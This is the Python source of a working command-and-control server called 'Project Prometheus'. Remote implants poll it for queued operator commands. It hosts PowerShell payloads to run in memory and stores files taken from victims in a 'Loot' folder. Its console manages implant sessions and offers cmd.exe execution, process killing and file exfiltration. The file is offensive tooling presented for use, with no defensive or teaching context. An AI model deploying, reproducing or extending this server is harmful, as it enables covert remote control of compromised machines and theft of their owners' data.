import http.server
import socketserver
import threading
import queue
import os
import sys
import time
import readline

# --- CONFIGURATION ---
IP_ADDR = "192.168.0.20"
PORT = 8080
DOWNLOAD_DIR = "Loot"
SCRIPT_DIR = "Scripts"

# Ensure directories exist
for d in [DOWNLOAD_DIR, SCRIPT_DIR]:
    if not os.path.exists(d): os.makedirs(d)

# --- GLOBAL STATE ---
sessions = {} 
active_target = None
sessions_lock = threading.Lock()

class MasterHandler(http.server.SimpleHTTPRequestHandler):
    def log_message(self, format, *args): return # Silent

    def do_GET(self):
        """Handle heartbeat, command fetching, and script hosting."""
        
        # 1. SERVE PAYLOADS (Case-Insensitive)
        if self.path.lower().startswith("/scripts/"):
            script_name = self.path.split("/")[-1]
            script_path = os.path.join(SCRIPT_DIR, script_name)
            
            if os.path.exists(script_path) and os.path.isfile(script_path):
                self.send_response(200)
                self.send_header("Content-Type", "text/plain")
                self.end_headers()
                try:
                    with open(script_path, 'rb') as f:
                        self.wfile.write(f.read())
                    print(f"\n[+] Served payload: {script_name}")
                    if active_target: print_prompt()
                except Exception as e:
                    print(f"\n[!] Error serving script: {e}")
            else:
                self.send_error(404, "Script not found")
                print(f"\n[!] 404 Not Found: {script_name}")
            return

        # 2. HEARTBEAT & COMMANDS
        client_id = self.headers.get('X-ID', 'UNKNOWN')
        cwd = self.headers.get('X-CWD', 'UNKNOWN')

        with sessions_lock:
            if client_id not in sessions:
                sessions[client_id] = {'queue': queue.Queue(), 'cwd': cwd}
                sys.stdout.write(f"\n[+] New Session: {client_id}\n")
                if active_target: print_prompt()
            # Update CWD
            sessions[client_id]['cwd'] = cwd
        
        self.send_response(200)
        self.end_headers()
        
        if client_id in sessions and not sessions[client_id]['queue'].empty():
            cmd = sessions[client_id]['queue'].get()
            self.wfile.write(cmd.encode())
        else:
            self.wfile.write(b"NOOP")

    def do_POST(self):
        """Handle output and file exfiltration."""
        client_id = self.headers.get('X-ID', 'UNKNOWN')
        data_type = self.headers.get('X-Type', 'TEXT')
        
        try:
            length = int(self.headers['Content-Length'])
            data = self.rfile.read(length)

            if data_type == 'FILE':
                # EXFILTRATION LOGIC
                filename = self.headers.get('X-FileName', f"loot_{int(time.time())}.bin")
                path = os.path.join(DOWNLOAD_DIR, client_id, filename)
                os.makedirs(os.path.dirname(path), exist_ok=True)
                with open(path, 'wb') as f: f.write(data)
                print(f"\n[+] Loot secured: {path}\n")
            else:
                # STANDARD OUTPUT LOGIC
                output = data.decode('utf-8', errors='replace').strip()
                if not output: output = "[!] Empty response received."
                print(f"\n{output}\n")
            
            if active_target: print_prompt()
            self.send_response(200)
            self.end_headers()

        except Exception as e:
            print(f"\n[!] Error POST: {e}")

def print_prompt():
    if active_target:
        cwd = sessions.get(active_target, {}).get('cwd', '?')
        prompt = f"PROMETHEUS [{active_target} @ {cwd}] > "
    else:
        prompt = "PROMETHEUS > "
    sys.stdout.write(prompt)
    sys.stdout.flush()

def command_shell():
    global active_target
    print(f"[*] Project Prometheus Master Node: {IP_ADDR}:{PORT}")
    print(f"[*] Script Directory: {os.path.abspath(SCRIPT_DIR)}")
    
    # HISTORY SETUP
    histfile = os.path.join(os.path.expanduser("~"), ".prometheus_history")
    try: readline.read_history_file(histfile)
    except FileNotFoundError: pass

    while True:
        try:
            user_input = input(f"PROMETHEUS [{active_target if active_target else 'BROADCAST'}] > ").strip()
            
            if not user_input: continue
            readline.write_history_file(histfile)
            
            parts = user_input.split(" ")
            cmd = parts[0].upper()

            if cmd == "HELP":
                print("\n[--- SESSION MANAGEMENT ---]")
                print(" SESSIONS         - List active implants")
                print(" USE [ID]         - Target a specific implant")
                print(" BACK             - Deselect target")
                print(" EXIT             - Kill server")
                print("\n[--- FILE SYSTEM ---]")
                print(" LS / DIR         - List files in current directory")
                print(" CD [path]        - Change directory")
                print(" PWD              - Show current path")
                print(" CAT [file]       - Read text file")
                print(" DOWNLOAD [file]  - Exfiltrate file to 'Loot/' folder")
                print("\n[--- EXECUTION ---]")
                print(" SHELL [cmd]      - Run cmd.exe command")
                print(" INVOKE [script]  - Run PowerShell script in memory")
                print(" PS               - List running processes")
                print(" KILL [pid]       - Terminate process")
                print("")

            elif cmd == "SESSIONS":
                print("\n[ ACTIVE TARGETS ]")
                with sessions_lock:
                    for s in sessions: print(f" - {s}")
                print("")

            elif cmd == "USE":
                if len(parts) > 1 and parts[1] in sessions:
                    active_target = parts[1]
                else: print("[!] Invalid Target ID")

            elif cmd == "BACK":
                active_target = None

            elif cmd == "EXIT":
                os._exit(0)

            elif active_target:
                sessions[active_target]['queue'].put(user_input)
            else:
                print("[!] Target required. Use 'USE [ID]'")

        except KeyboardInterrupt:
            print("\n[*] Exiting...")
            os._exit(0)

if __name__ == "__main__":
    threading.Thread(target=command_shell, daemon=True).start()
    socketserver.TCPServer.allow_reuse_address = True
    with socketserver.TCPServer(("", PORT), MasterHandler) as httpd:
        httpd.serve_forever()